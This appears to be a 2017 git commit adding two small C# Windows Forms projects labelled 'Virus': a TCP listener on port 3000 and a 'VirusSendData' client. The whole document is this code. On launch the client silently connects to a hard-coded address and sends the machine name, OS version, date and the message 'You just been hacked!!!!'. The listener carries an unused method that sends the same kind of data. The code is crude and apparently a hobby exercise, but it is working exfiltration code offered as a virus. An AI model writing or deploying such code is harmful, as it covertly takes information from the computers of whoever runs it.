ae5d12b1d63052d227f18d540a899b9e2b49f962
Mark <markroland@youmail.com>
2017-01-02 22:31:37 +0100

    Virus retrieval software Virus send data program

---
+++ VirusRetrieveData/Virus/Form1.cs
@@ -0,0 +1,108 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Management;
+using Microsoft.Win32;
+
+namespace Virus
+{
+    public partial class Form1 : Form
+    {
+
+        private TcpListener _tcpListener;
+        private Thread _listenThread;
+
+        public Form1()
+        {
+            InitializeComponent();
+            Server();
+
+        }
+
+        public void SendData()
+        {
+            var clientConnection = new TcpClient();
+            clientConnection.Connect("192.168.1.217",3000);
+            NetworkStream nwStream = clientConnection.GetStream();
+            byte[] bytesToSend = ASCIIEncoding.ASCII.GetBytes(Environment.MachineName + Environment.NewLine + Environment.OSVersion);
+            nwStream.Write(bytesToSend, 0, bytesToSend.Length);
+            clientConnection.Close();
+        }
+
+
+        public void Server()
+        {
+            _tcpListener = new TcpListener(IPAddress.Any, 3000);
+            _listenThread = new Thread(new ThreadStart(ListenForClients));
+            richTextBox1.Text = "Server started - listining on port 3000";
+            _listenThread.Start();
+        }
+
+
+        private void ListenForClients()
+        {
+            this._tcpListener.Start();
+
+            while (true)
+            {
+                //blocks until a client has connected to the server
+                TcpClient client = this._tcpListener.AcceptTcpClient();
+                HandleClientComm(client);
+                //create a thread to handle communication 
+                //with connected client
+                //Thread clientThread = new Thread(new ParameterizedThreadStart(HandleClientComm));
+                //clientThread.Start(client);
+            }
+        }
+
+        private void HandleClientComm(object client)
+        {
+            TcpClient tcpClient = (TcpClient)client;
+            NetworkStream clientStream = tcpClient.GetStream();
+
+            byte[] message = new byte[4096];
+            int bytesRead;
+            richTextBox1.Text = "listining for clients...";
+            while (true)
+            {
+                bytesRead = 0;
+
+                try
+                {
+                    //blocks until a client sends a message
+                    bytesRead = clientStream.Read(message, 0, 4096);
+                    string result = System.Text.Encoding.UTF8.GetString(message);
+                    richTextBox1.Text = result;
+
+                }
+                catch
+                {
+                    //a socket error has occured
+                    break;
+                }
+
+                if (bytesRead == 0)
+                {
+                    //the client has disconnected from the server
+                    break;
+                }
+
+                //message has successfully been received
+                ASCIIEncoding encoder = new ASCIIEncoding();
+                System.Diagnostics.Debug.WriteLine(encoder.GetString(message, 0, bytesRead));
+            }
+
+            tcpClient.Close();
+        }
+    }
+}
---
+++ VirusSendData/VirusSendData/Form1.cs
@@ -0,0 +1,36 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace VirusSendData
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            var stopWatch = new Stopwatch();
+            stopWatch.Start();
+            InitializeComponent();
+            var clientConnection = new TcpClient();
+            clientConnection.Connect("192.168.1.193", 3000);
+            Thread.Sleep(3);
+            NetworkStream nwStream = clientConnection.GetStream();
+            byte[] bytesToSend = Encoding.ASCII.GetBytes(DateTime.Now.ToLongDateString() + Environment.NewLine + Environment.MachineName + Environment.NewLine + Environment.OSVersion + Environment.NewLine + "You just been hacked!!!!");
+            stopWatch.Stop();
+            nwStream.Write(bytesToSend, 0, bytesToSend.Length);
+            clientConnection.Close();
+            var directory = Thread.GetDomain().BaseDirectory + "\\ExecutionTime\\";
+            File.AppendAllText(directory + "ExecutionTime.txt", "Executed in: " + stopWatch.Elapsed + Environment.NewLine);
+        }
+    }
+}
